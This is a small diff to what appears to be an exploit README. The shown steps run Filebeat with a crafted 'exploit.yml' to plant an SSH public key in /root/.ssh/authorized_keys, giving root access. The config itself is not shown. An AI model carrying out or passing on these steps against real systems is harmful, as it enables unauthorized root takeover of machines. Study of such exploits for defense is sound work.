@@ -19,7 +19,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDSNDOAMkNcqtwWnG[...]4Cn1s0XfNOEmXYQBPJUZN
 3) Run the follwowing command
 
 ```
- ./filebeat -c exploit.yml
+$ ./filebeat -c exploit.yml
 ```
 
 5) Enjoy your key added to /root/.ssh/authorized_keys
